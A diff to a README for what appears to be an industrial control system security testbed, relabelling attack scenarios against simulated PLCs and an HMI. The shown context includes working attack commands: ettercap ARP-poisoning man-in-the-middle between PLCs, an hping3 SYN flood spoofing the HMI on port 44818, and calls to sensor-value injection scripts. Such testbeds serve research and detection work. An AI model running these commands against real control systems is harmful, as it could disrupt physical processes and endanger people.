@@ -50,17 +50,17 @@ Note: Launch all attacks from attacker node terminal.
 
 IP to nodes mapping: PLC1 <--> 10.0.0.1, PLC2 <--> 10.0.0.2, PLC3 <--> 10.0.0.3, HMI <--> 10.0.0.4, ATTACKER <--> 10.0.0.5
 
-**Attack scenario 1** (False data injection): Run the following script to launch this attack for x minutes.
+**Attack scenario 1** (Command injection): Run the following script to launch this attack for x minutes.
 
     python attack_fdi.py <x>
 
-**Attack scenario 2, 3, 4** (MitM/DoS): Run the following commands for attacks 2, 3, 4 respectively.
+**Attack scenario 2, 3, 4** (Network DoS MitM/DoS): Run the following commands for attacks 2, 3, 4 respectively.
 
     ettercap -T -i attacker-eth0 -M ARP /10.0.0.1// /10.0.0.2//
     ettercap -T -i attacker-eth0 -M ARP /10.0.0.1// /10.0.0.3//
     ettercap -T -i attacker-eth0 -M ARP /10.0.0.1// 
 
-**Attack scenario 5** (TCP SYN flooding)
+**Attack scenario 5** (Network DoS TCP SYN flooding)
 
     hping3 -S -a 10.0.0.4 --flood -V -p 44818 10.0.0.1
 
@@ -69,13 +69,13 @@ IP to nodes mapping: PLC1 <--> 10.0.0.1, PLC2 <--> 10.0.0.2, PLC3 <--> 10.0.0.3,
     ettercap -T -i attacker-eth0 -M ARP /10.0.0.1// &
     echo 1 > /proc/sys/net/ipv4/ip_forward
 
-**Attack scenario 6,7,8** (MitM/Data tampering): Run the following commands for attacks 6, 7, 8 respectively.
+**Attack scenario 6,7,8** (Naive Measurement Injection): Run the following commands for attacks 6, 7, 8 respectively.
 
     python attack_sensor_constant.py PLC2
     python attack_sensor_constant.py PLC3
     python attack_sensor_constant.py BOTH
 
-**Attack scenario 9,10,11 (MitM/Scaling positive) and Attack scenario 12,13,14 (MitM/Scaling negative)
+**Attack scenario 9,10,11 (Calculated Measurement Injection +ve scaling) and Attack scenario 12,13,14 (Calculated Measurement Injection negative scaling)
 
     python attack_sensor_scaling.py PLC2 +
     python attack_sensor_scaling.py PLC3 +
@@ -84,13 +84,13 @@ IP to nodes mapping: PLC1 <--> 10.0.0.1, PLC2 <--> 10.0.0.2, PLC3 <--> 10.0.0.3,
     python attack_sensor_scaling.py PLC3 -
     python attack_sensor_scaling.py BOTH -
 
-**Attack scenario 15,16,17 (MitM/Data tampering)
+**Attack scenario 15,16,17 (Naive Measurement Injection)
 
     python attack_sensor_random_withinlimits.py PLC2
     python attack_sensor_random_withinlimits.py PLC3
     python attack_sensor_random_withinlimits.py BOTH
 
-**Attack scenario 18,19,20 (MitM/Scaling positive) and Attack scenario 21,22,23 (MitM/Scaling negative)
+**Attack scenario 18,19,20 (Calculated Measurement Injetcion positive) and Attack scenario 21,22,23 (Calculated Measurement Injection negative)
 
     python attack_sensor_randomp.py PLC2
     python attack_sensor_randomp.py PLC3
